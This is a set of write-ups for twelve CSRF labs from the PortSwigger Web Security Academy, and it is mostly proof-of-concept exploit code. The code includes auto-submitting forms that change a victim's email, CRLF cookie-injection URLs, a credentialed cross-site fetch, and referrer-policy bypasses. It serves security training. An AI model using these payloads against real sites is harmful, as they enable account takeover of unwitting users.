# CSRF Labs 01-12 — Proof of Concept Writeups

This document contains structured Proof of Concept (PoC) writeups for Cross-Site Request Forgery (CSRF) Labs 01 to 12 from the PortSwigger Web Security Academy.

---

## Lab 01 — CSRF vulnerability with no defenses

- **Goal:** Trigger email change for the victim.
- **Vulnerability:** Absence of CSRF tokens or SameSite protections.

### Proof of Concept (PoC)
```html
<html>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Lab 02 — CSRF vulnerability where token validation depends on request method

- **Goal:** Change victim's email.
- **Vulnerability:** CSRF verification is only applied on `POST` requests.

### Proof of Concept (PoC)
```html
<html>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Lab 03 — CSRF vulnerability where token validation depends on token being present

- **Goal:** Change victim's email.
- **Vulnerability:** If the `csrf` parameter is missing from the request, validation is skipped.

### Proof of Concept (PoC)
```html
<html>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <!-- The 'csrf' input parameter is completely removed -->
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Lab 04 — CSRF vulnerability where token is not tied to user session

- **Goal:** Change victim's email.
- **Vulnerability:** Token validation only verifies if the token exists in the global active pool.

### Proof of Concept (PoC)
1. Log in to your attacker account and extract a fresh CSRF token (e.g. `ATTACKER_TOKEN`).
2. Insert this token into the exploit form.
```html
<html>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="hidden" name="csrf" value="ATTACKER_TOKEN" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Lab 05 — CSRF vulnerability where token is tied to non-session cookie

- **Goal:** Change victim's email.
- **Vulnerability:** Cookie validation discrepancy (CSRF key in cookies is matched against body token, but not associated with the user session).

### Proof of Concept (PoC)
1. Extract a valid token and matching cookie key from your attacker account session.
2. Exploit a CRLF injection in the search input to set the victim's cookie:
   `/?search=test%0d%0aSet-Cookie:csrfKey=ATTACKER_CSRF_COOKIE_KEY;%20SameSite=None`
3. Trigger the CSRF exploit carrying your attacker token:
```html
<html>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="hidden" name="csrf" value="ATTACKER_CSRF_TOKEN" />
    </form>
    <img src="https://<lab-id>.web-security-academy.net/?search=test%0d%0aSet-Cookie:csrfKey=ATTACKER_CSRF_COOKIE_KEY;%20SameSite=None" onerror="document.forms[0].submit()" />
  </body>
</html>
```

---

## Lab 06 — CSRF vulnerability where token is duplicated in cookie (Double Submit)

- **Goal:** Change victim's email.
- **Vulnerability:** Server only validates if the cookie value matches the body token value.

### Proof of Concept (PoC)
1. Generate an arbitrary string (e.g., `dummy`).
2. Inject this string as the victim's CSRF cookie via the search parameter CRLF vulnerability.
3. Submit the form with the identical string `dummy` in the `csrf` body parameter:
```html
<html>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="hidden" name="csrf" value="dummy" />
    </form>
    <img src="https://<lab-id>.web-security-academy.net/?search=test%0d%0aSet-Cookie:csrf=dummy;%20SameSite=None" onerror="document.forms[0].submit()" />
  </body>
</html>
```

---

## Lab 07 — SameSite Lax bypass via method override

- **Goal:** Change victim's email.
- **Vulnerability:** The server allows GET requests to perform change email actions, bypassing Lax.

### Proof of Concept (PoC)
```html
<html>
  <body>
    <script>
      // Top-level navigation using GET method triggers Lax cookies to send
      document.location = "https://<lab-id>.web-security-academy.net/my-account/change-email?email=attacker@evil.com";
    </script>
  </body>
</html>
```

---

## Lab 08 — SameSite Strict bypass via client-side redirect

- **Goal:** Change victim's email.
- **Vulnerability:** Client-side redirect maps relative paths directly.

### Proof of Concept (PoC)
1. Locate a client-side open redirect or redirect parameter on the target site (e.g., `/post?postId=1&url=/my-account`).
2. Redirect paths originate internally, meaning SameSite Strict cookies are sent since the request is same-origin.
3. Exploitation payload:
```html
<html>
  <body>
    <script>
      document.location = "https://<lab-id>.web-security-academy.net/post?postId=1&url=/my-account/change-email?email=attacker@evil.com";
    </script>
  </body>
</html>
```

---

## Lab 09 — SameSite Strict bypass via sibling domain

- **Goal:** Change victim's email.
- **Vulnerability:** Sibling domain (e.g., chat server) has a WebSocket or XSS vulnerability that executes payloads in same-origin contexts.

### Proof of Concept (PoC)
1. Locate XSS on a sibling domain (e.g. `chat.<lab-id>.web-security-academy.net`).
2. Inject a script payload that performs a POST request to the main account changing email endpoint:
```javascript
fetch('https://<lab-id>.web-security-academy.net/my-account/change-email', {
  method: 'POST',
  body: 'email=attacker@evil.com',
  credentials: 'include'
});
```

---

## Lab 10 — SameSite Lax bypass via cookie refresh

- **Goal:** Change victim's email.
- **Vulnerability:** OAuth login flows refresh session cookies without verifying authorization.

### Proof of Concept (PoC)
```html
<html>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>
      // Navigate to trigger OAuth sequence, then submit the change email request
      window.open('https://<lab-id>.web-security-academy.net/oauth-login');
      setTimeout(() => { document.forms[0].submit(); }, 2000);
    </script>
  </body>
</html>
```

---

## Lab 11 — CSRF where Referer validation depends on header being present

- **Goal:** Change victim's email.
- **Vulnerability:** If the `Referer` header is missing, the backend validation bypasses checks.

### Proof of Concept (PoC)
```html
<html>
  <head>
    <!-- Instructs browser not to send Referer header for cross-site requests -->
    <meta name="referrer" content="never">
  </head>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Lab 12 — CSRF with broken Referer validation

- **Goal:** Change victim's email.
- **Vulnerability:** Weak regex matches the target domain string anywhere in the Referer URL.

### Proof of Concept (PoC)
1. Host the exploit on a server containing the target domain string as a path parameter:
   `https://attacker-domain.net/exploit?target-domain.net`
2. Configure the browser header referrer policy to send the complete URL query parameter:
```html
<html>
  <head>
    <meta name="referrer" content="unsafe-url">
  </head>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
3. The resulting `Referer` header matches the target domain validation string, permitting the attack.
